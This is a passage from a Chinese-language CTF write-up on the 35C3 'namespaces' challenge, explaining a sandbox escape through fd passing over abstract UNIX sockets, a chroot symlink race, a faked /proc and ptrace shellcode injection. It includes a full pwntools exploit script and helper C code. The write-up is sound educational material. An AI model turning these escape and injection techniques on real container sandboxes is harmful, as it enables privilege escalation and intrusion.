class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">child_func</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fd = global_fd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;namespace1&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;chroot failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dir == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to open root directory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Child] Listing root directory contents:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] %s\n&quot;</span>, entry-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buffer[bytes_read] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] Flag content: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to read the flag file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">char</span> *stack_top;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> flags = SIGCHLD;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = <span class="built_in">malloc</span>(STACK_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">stack</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    stack_top = <span class="built_in">stack</span> + STACK_SIZE;</span><br><span class="line">    </span><br><span class="line">    global_fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (global_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open flag file in parent&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pid = clone(child_func, stack_top, CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET | flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    close(global_fd);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">stack</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里就引入了我们在背景知识中提到的socket AF_UNIX通信，它可以用来作为进程间通信的工具，他主要分为三种<strong>pathname</strong>，<strong>unnamed</strong>，<strong>abstract</strong>，这三种可以简单说一下，<strong>pathname</strong>是通过文件来实现进程间通信的，但是对于本题来说，由于namespace中设置了mnt namespace，所以不同沙盒中的进程是看不到共同的文件路径的中文件的，因此这个方法行不通，对于<strong>unnamed</strong>来说，主要是用来接受进程间通信的信息的可以用来接受后面fd的步骤，之后对于<strong>abstract</strong>来说，通过创建一个匿名文件来进行进程间通信，非常符合本题的要求，因此我们通过<strong>abstract</strong>来发送文件描述符给另一个沙盒程序，然后他用<strong>unnamed</strong>来接受文件描述符。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>​	为了成功读取 flag 文件并提升权限，我们需要仔细研究 namespace 设置的顺序，通常按照 <strong>user</strong>、<strong>mnt</strong>、<strong>pid</strong>、<strong>uts</strong>、<strong>ipc</strong> 和 <strong>cgroup</strong> 的顺序进行操作。在设置 pid namespace 时，通过 fork 创建子进程，子进程进入目标的 pid namespace，才能看到该沙盒内的进程，并进行后续操作。namespace 设置完毕后，再进行权限设置。此时，可以使用 ptrace 来监控 pid namespace 中的进程，检测到新的进程加入时，使用 ptrace 调试并修改其 rip 寄存器，使其指向预设的 shellcode，执行读取 flag 文件的操作，从而实现特权提升并获取 flag。</p>
<p><img src="/images/namespace/1735447328412.jpg" alt="1735447328412"></p>
<p>​	但是在写exp的时候发现一个问题也就是，linux中存在<strong>capabilities</strong>机制，在过去的 Linux 系统中，sudo 和 SUID（Set User ID）机制让普通用户可以执行 root 权限的操作，但这两者都会赋予普通用户完整的 root 权限，存在较大的安全风险。为了解决这个问题，Linux 从内核 2.2 开始引入了 <strong>capabilities</strong> 机制，将 root 权限细分为多个独立的能力，每个能力对应系统中特定的操作。通过这种方式，进程只会获得执行特定任务所需的权限，而无需赋予其完整的 root 权限。</p>
<p><strong>Capabilities</strong> 机制 允许进程获得执行特定任务所需的权限，而不需要拥有 root 权限。普通用户通常没有 <strong>capabilities</strong>，而 root 用户拥有所有的 <strong>capabilities</strong>。当进程创建或加入新的 user namespace 时，无论其 UID 和 GID 如何变化，都会获得新 namespace 中的 root 权限和所有 <strong>capabilities</strong>。尽管如此，新的 user namespace 中的 root 用户仍然受到一些限制，例如无法访问不在该 namespace 中映射的文件。此外对于在使用<strong>execve</strong>执行用户输入的elf后将不具有任何的<strong>capabilities</strong>，因此也就没有办法直接使用ptrace对于其他进程进行修改rip的操作。</p>
<p>​	新建 user namespaces 本身并不需要任何特殊的 <strong>capabilities</strong>，因此可以通过创建新的 user namespace 获取所有 <strong>capabilities</strong>，从而执行特权操作。然而，chroot 后的进程无法创建新的 user namespaces，这一限制旨在防止 chroot 环境中的进程逃逸。通过这种机制，Linux 实现了对 root 权限的细粒度控制，既保证了安全性，又提供了灵活性。因此为了逃逸Chroot我们需要进行条件竞争，按照下述流程首先删除&#x2F;c目录然后把&#x2F;c目录指向&#x2F;目录，之后c沙盒其实就是在根目录的环境了也就可以创建user namespace</p>
<ol>
<li><strong>c沙盒start_sandbox创建&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
<li><strong>a沙盒中的进程检测到&#x2F;tmp&#x2F;chroots&#x2F;c，将其替换为软链接</strong></li>
<li><strong>c沙盒chroot到&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
</ol>
<p>​	逃逸后，我们可以通过在新的 user namespace 中创建命名空间并使用 ptrace 进行调试操作，但如果进程进入到新的 user namespace，它将无法访问之前的 pid namespace，因此也无法观测和修改沙盒中的进程。</p>
<p>​	为了解决这一问题，我们可以同时clone的时候加入 user namespace， pid namespace，但这会导致进程不再处于原有的 pid namespace 中，无法直接通过 ptrace 修改沙盒进程，即run_elf的进程只会setns到start_sandbox里面的父进程中，而这时我们可以有ptrace能力的是子进程，并且与父进程不在同一个pid中。此时，我们需要利用mnt namespace对 &#x2F;proc 目录进行修改。具体而言，需要加入user namespace pid namespace 和 mnt namespace 三个标志，这样可以通过修改 &#x2F;proc，并在子进程中将原本的 &#x2F;proc 保存到其他地方，重新挂载一个空的 &#x2F;proc。接着，我们可以在原先父进程的 pid namespace 位置创建一个符号链接，指向子进程的 pid namespace。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Holding CAP_SYS_ADMIN within the user namespace that owns a process’s mount namespace allows that process to create bind mounts and mount the following types of filesystems:</span><br><span class="line"></span><br><span class="line">- /proc (since Linux 3.8)</span><br><span class="line">- /sys (since Linux 3.8)</span><br><span class="line">- devpts (since Linux 3.9)</span><br><span class="line">- tmpfs(5) (since Linux 3.9)</span><br><span class="line">- ramfs (since Linux 3.9)</span><br><span class="line">- mqueue (since Linux 3.9)</span><br><span class="line">- bpf (since Linux 4.4)</span><br></pre></td></tr></table></figure>

<p>​	由于父子进程处于同一个目录下，子进程在 mnt namespace 中的挂载操作会自动传播到父进程，这样父进程的 &#x2F;proc 将与子进程的 &#x2F;proc 保持一致。最终，父进程会看到伪造后的 &#x2F;proc，从而加入到子进程的 pid namespace 中，这时。这时，子进程便能够通过 ptrace 注入 shellcode，成功读取 &#x2F;flag 文件，从而完成提权操作。</p>
<p>​	为了提高最终成功执行 ptrace 的概率，我们可以在伪造的 &#x2F;proc 中将 uts namespace 设置为一个 FIFO 管道，这样当 run_elf 进程在此处阻塞时，CPU 将转而执行 start_sandbox 子进程中的 ptrace 操作。尽管这一额外步骤并非必需，但它可以增加成功的几率，从而使得 ptrace 成功执行。</p>
<p>​	此外借用<a target="_blank" rel="noopener" href="https://liotree.github.io/2022/08/12/35c3ctf-Pwn-namespaces/">文章</a>中提到的，有一个常见的误解是，ptrace 需要被跟踪的进程首先调用 ptrace(PTRACE_TRACEME, 0, 0, 0) 才能成功执行。但经过实验后发现，并非如此（否则类似 strace 的工具就无法追踪进程了）。虽然 man 文档中对于 PTRACE_TRACEME 的描述比较模糊，但在更详细的文档中可以找到解释：PTRACE_TRACEME 用于指示该进程将被其父进程跟踪，任何除 SIGKILL 之外的信号都会导致该进程停止，并通过 wait(2) 通知父进程。而且，当该进程之后调用 execve(2) 时，会发送 SIGTRAP 信号给进程，父进程有机会在新程序执行前获得控制。这是 ptrace 成功执行的关键步骤之一。当前文档中这段描述已经被去除，但其原始含义是十分重要的。</p>
<h2 id="exp脚本详解"><a href="#exp脚本详解" class="headerlink" title="exp脚本详解"></a>exp脚本详解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./namespaces&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># compile all four binaries</span></span><br><span class="line">    prepare_bins()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="comment"># r = process(&quot;./namespaces&quot;)</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    hook_recv(r)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 0 and 1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        start_sandbox(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;[sleep]  Started sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># send fd in sandbox 0</span></span><br><span class="line">    run_file(<span class="number">0</span>, <span class="string">&#x27;sendfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[sendfd]  Accepting&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># recv fd in sandbox 1, race creation of chroot for sandbox 2</span></span><br><span class="line">    run_file(<span class="number">1</span>, <span class="string">&#x27;recvfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[recvfd]  Starting race&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 2, hope we win the race</span></span><br><span class="line">    <span class="comment"># inside sandbox 2, set a trap for the next process joining sandbox 2</span></span><br><span class="line">    start_sandbox(<span class="string">&#x27;escalate&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[escalate]  Waiting for victim to join&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># let a process join sandbox 2 to escalate to root</span></span><br><span class="line">    run_file(<span class="number">2</span>, <span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;DONE&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sandbox</span>(<span class="params">init</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Starting sandbox: %s&quot;</span>, init)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    send_elf(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_file</span>(<span class="params">idx, elf</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Running in sandbox #%d: %s&quot;</span>, idx, elf)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;which sandbox? &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    send_elf(elf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_elf</span>(<span class="params">elf</span>):</span><br><span class="line">    elf = bins[elf]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;elf len? &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(elf)).encode())</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;data? &#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> context.local(log_level=<span class="string">&#x27;INFO&#x27;</span>):</span><br><span class="line">        r.send(elf)</span><br><span class="line">    </span><br><span class="line">    log.debug(<span class="string">&quot;Sent ELF file&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_bins</span>():</span><br><span class="line">    <span class="keyword">global</span> bins</span><br><span class="line">    bins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    names = <span class="string">&#x27;sleep sendfd recvfd escalate&#x27;</span>.split()</span><br><span class="line">    rand = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">    sc = shellcode()</span><br><span class="line">    </span><br><span class="line">    directory = tempfile.mkdtemp()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        os.system(<span class="string">&#x27;gcc -Wall -Wextra -Wno-unused-function -O3 -static -m64 -o %s/bin binaries.c -DMAIN=%s -DRAND=%s -DSHELLCODE=%s&#x27;</span> %</span><br><span class="line">                  (directory, name, rand, sc))</span><br><span class="line">        bins[name] = read(directory + <span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    shutil.rmtree(directory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    sc = shellcraft.echo(<span class="string">&#x27;[shellcode]  FLAG: &#x27;</span>) + shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>) + \</span><br><span class="line">        shellcraft.echo(<span class="string">&#x27;[shellcode]  DONE&#x27;</span>) + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">16</span> + asm(sc)</span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">8</span> - (<span class="built_in">len</span>(sc) % <span class="number">8</span>)) + sc</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(sc) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Shellcode:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexdump(sc))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    sc = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, unpack_many(sc, <span class="number">8</span>)))</span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_recv</span>(<span class="params">r</span>):</span><br><span class="line">    old_recv = r.recv_raw</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_recv</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        ret = old_recv(*args, **kwargs)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> ret.splitlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;[&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(line[line.index(<span class="string">b&#x27;[&#x27;</span>):])</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line">    r.recv_raw = new_recv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>​	首先介绍一下exp这个脚本，他主要的工作便是编译binaries.c脚本，生成不同的exp发送给容器中，然后根据对应顺序执行，并且生成了对应的shellcode也一同提供给exp中，原仓库中的脚本本来时python2的我这里进行简单的修改。</p>
<p>​	之后便是对于binaries.c的文件进行详细的阐述，首先也就是最简单的do_sleep函数，这里十分简单就是sleep，通过sleep创建两个sandbox方便后面利用run_elf来进行chroot逃逸。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sleep</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是do_sendfd，这里其实就是利用了之前说的<strong>abstract</strong> socket进行进程之间的通信，然后发送fd信息给另一个进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sendfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Opening fd&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = CHECK_CALL(open, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setup_socket_and_send_fd(fd);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">setup_socket_and_send_fd</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Binding&quot;</span>);</span><br><span class="line">    CHECK_CALL(bind, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Listening&quot;</span>);</span><br><span class="line">    CHECK_CALL(listen, sock, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Accepting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(accept, sock, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    send_fd(conn, fd);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">create_socket</span><span class="params">(<span class="type">int</span> *sock, <span class="keyword">struct</span> sockaddr_un *addr, <span class="type">socklen_t</span> *addrlen)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Creating socket&quot;</span>);</span><br><span class="line">    *sock = CHECK_CALL(socket, AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Creating addr&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(addr, <span class="number">0</span>, <span class="keyword">sizeof</span> *addr);</span><br><span class="line">    addr-&gt;sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr-&gt;sun_path, <span class="string">&quot;@&quot;</span> STR(RAND), <span class="keyword">sizeof</span> addr-&gt;sun_path - <span class="number">1</span>);</span><br><span class="line">    *addrlen = offsetof(<span class="keyword">struct</span> sockaddr_un, sun_path) + <span class="built_in">strlen</span>(addr-&gt;sun_path) + <span class="number">1</span>;</span><br><span class="line">    addr-&gt;sun_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	同理do_recvfd也是类似，这里我们之前讲述原理的时候也做过实验，fd是可以在不同namespace中传递的，因此这里按照之前所说的原理，首先不断循环检测..&#x2F;2文件夹是否存在，如果存在说明有了新的sandbox加入，然后就把他删除，之后通过symlinkat命令，把这个文件夹指向根目录</p>
